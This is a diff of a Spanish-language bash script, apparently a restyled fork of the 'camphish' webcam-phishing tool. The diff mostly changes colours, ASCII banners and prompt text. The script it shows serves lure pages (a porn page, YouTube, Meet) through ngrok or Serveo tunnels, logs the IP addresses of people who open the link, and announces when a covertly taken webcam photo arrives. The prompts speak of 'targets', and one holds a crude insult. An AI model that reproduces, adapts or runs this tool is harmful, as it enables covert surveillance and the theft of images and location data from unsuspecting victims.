@@ -1,23 +1,49 @@
 
 clear
+white="\33[1;37m"
+grey="\33[0;37m"
+purple="\33[0;35m"
+red="\33[1;31m"
+green="\33[1;32m"
+yellow="\33[1;33m"
+Purple="\33[0;35m"                                                         
+Cyan="\33[0;36m"
+Cafe="\33[0;33m"
+Fiuscha="\33[0;35m"
+blue="\33[1;34m"
 echo ""
+echo -e "$red"
+echo "ERES INVICIBLE "
 echo ""
-echo "SI ESTAS LEYENDO ESTO "
-echo ""
-sleep 2
-echo "ELLA NO TE AMA"
-
-sleep 3
+sleep 1
 clear
 
 
 echo "
-██████╗  ██████╗      ██╗ ██████╗ 
-██╔══██╗██╔═══██╗     ██║██╔═══██╗
-██████╔╝██║   ██║     ██║██║   ██║
-██╔══██╗██║   ██║██   ██║██║   ██║
-██║  ██║╚██████╔╝╚█████╔╝╚██████╔╝
-╚═╝  ╚═╝ ╚═════╝  ╚════╝  ╚═════╝ 7 "
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣀⣤⣤⠄⢀⣤⠀⣾⣿⣿⣿⠀⣀⠀⢠⣤⣤⣀⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⣶⣿⣿⣿⠃⣰⣿⣿⣄⠙⠿⠿⠋⣠⣿⣷⡄⠹⣿⣿⣿⣶⡀⠀⠀⠀ ██████╗  ██████╗      ██╗ ██████╗ 
+⠀⠀⣰⣿⣿⣿⣿⠇⢰⣿⣿⣿⣿⣷⣶⣶⣾⣿⣿⣿⣿⡀⢹⣿⣿⣿⣿⣄⠀⠀ ██╔══██╗██╔═══██╗     ██║██╔═══██╗
+⠀⢸⣿⣿⡿⠋⠀⠀⣿⡏⠀⠙⠻⣿⣿⣿⣿⠟⠁⠀⣿⣧⠀⠀⠙⢿⣿⣿⡆⠀ ██╔══██╗██║   ██║██   ██║██║   ██║
+⠀⣿⣿⡿⠀⠀⠀⢰⣿⣿⣤⣤⣴⣿⣿⣿⣿⣦⣤⣴⣿⣿⠀⠀⠀⠈⣿⣿⡇⠀ ██║  ██║╚██████╔╝╚█████╔╝╚██████╔╝
+⠀⢹⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣷⡙⠻⠟⢩⣿⣿⣿⣿⣿⠀⠀⠀⠀⣼⣿⡇⠀ ╚═╝  ╚═╝ ╚═════╝  ╚════╝  ╚═════╝ 
+⠀⠈⠻⣿⣆⠀⠀⠈⠉⠉⠉⣿⣿⣷⡀⢠⣿⣿⡏⠉⠉⠉⠀⠀⠀⣰⣿⠟⠀⠀            HERRAMIENTA :  WEB.RED
+⠀⠀⠀⠈⠉⠓⠂⠀⠀⠀⠀⣿⣿⣿⣷⣿⣿⣿⡇⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢿⡟⠈⣿⡿⠈⢿⡇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡆⠘⢀⡆⠸⠃⣠⠈⠃⢸⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡇⠀⣾⣷⠀⢀⣿⣧⠀⣼⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⠇⠸⣿⣿⠀⠸⣿⣿⠆⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀    "
+
+
+
+
+                                      
+                                      
+                                       
+                                    
+                                       
 
 dependencies() {
 
@@ -52,7 +78,7 @@ catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] IP:\e[0m\e[1;31m %s\e[0m\n" $ip
 
 cat ip.txt >> saved.ip.txt
 
@@ -62,12 +88,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;31m*\e[0m\e[1;31m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;31m[\e[0m+\e[1;31m] COPIA EL LINK O ABRIR EL SERVIDOR SSH!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -76,7 +102,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] FOTO RECIBIDA \e[0m\n"
+printf "\n\e[1;31m[\e[0m+\e[1;31m] FOTO RECIBIDA \e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -90,7 +116,7 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] SERVEO ESPERE UN MOMENTO...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
@@ -146,13 +172,13 @@ printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m PAGINA PORNO ROJO 
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m YOU TUBE\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m MEET \e[0m\n"
 default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] OPCION [POR DEFECTO ES 1] \e[0m' option_tem
+read -p $'\n\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] OPCION [1 O 2] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] COLOCA TU NOMBRE: \e[0m' fest_name
+read -p $'\n\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] COLOCA TU PUTO NOMBRE: \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+read -p $'\n\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] ID DE VIDEO DE YOU TUBE: \e[0m' yt_video_ID
 elif [[ $option_tem -eq 3 ]]; then
 printf ""
 else
@@ -182,7 +208,7 @@ unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;31m[!] Download error... Termux, run:\e[0m\e[1;31m pkg install wget\e[0m\n"
 exit 1
 fi
 
@@ -193,7 +219,7 @@ unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
-printf "\e[1;93m[!] Download error... \e[0m\n"
+printf "\e[1;31m[!] Download error... \e[0m\n"
 exit 1
 fi
 fi
@@ -208,13 +234,13 @@ read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
 fi
 else
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] COLOCA TU AUTO TOKKEN: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
 fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "\e[1;31m[\e[0m+\e[1;31m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+printf "\e[1;31m[\e[0m+\e[1;31m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
@@ -239,10 +265,10 @@ rm -rf sendlink
 fi
 
    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\n\e[1;31m[\e[0m\e[1;31m01\e[0m\e[1;31m]\e[0m\e[1;31m Ngrok\e[0m\n"
+printf "\e[1;31m[\e[0m\e[1;31m02\e[0m\e[1;31m]\e[0m\e[1;31m Serveo.net\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ELIGE LA OPCION DE PUERTO [Default is 1] \e[0m' option_server
+read -p $'\n\e[1;31m[\e[0m\e[1;31m+\e[0m\e[1;31m] ELIGE LA OPCION DE PUERTO [Default is 1] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
 if [[ $option_server -eq 2 ]]; then
@@ -253,7 +279,7 @@ start
 elif [[ $option_server -eq 1 ]]; then
 ngrok_server
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\e[1;31m [!] Invalid option!\e[0m\n"
 sleep 1
 clear
 camphish
